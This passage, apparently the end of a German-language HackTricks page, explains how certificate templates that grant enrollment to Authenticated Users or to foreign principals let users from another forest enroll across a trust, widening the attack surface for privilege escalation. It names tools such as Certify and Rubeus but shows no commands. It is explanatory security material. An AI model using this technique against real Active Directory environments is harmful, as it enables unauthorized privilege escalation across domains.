Beim Authentifizieren über einen Trust wird die **Authenticated Users SID** vom AD dem Token des Benutzers hinzugefügt. Daher könnte, wenn eine Domain eine Enterprise CA mit einem Template besitzt, das **Authenticated Users Anmeldeberechtigungen erlaubt**, ein Template potenziell von einem Benutzer aus einem anderen Forest **angemeldet werden**. Ebenso wird, wenn **Anmeldeberechtigungen einem foreign principal explizit durch ein Template gewährt werden**, dadurch eine **cross-forest access-control-Beziehung geschaffen**, die es einem Principal aus einem Forest ermöglicht, **ein Template aus einem anderen Forest zu enrollen**.

Beide Szenarien führen zu einer **Erweiterung der Angriffsfläche** von einem Forest zu einem anderen. Die Einstellungen des certificate templates könnten von einem Angreifer ausgenutzt werden, um zusätzliche Privilegien in einer fremden Domain zu erlangen.


## References

- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../../banners/hacktricks-training.md}}
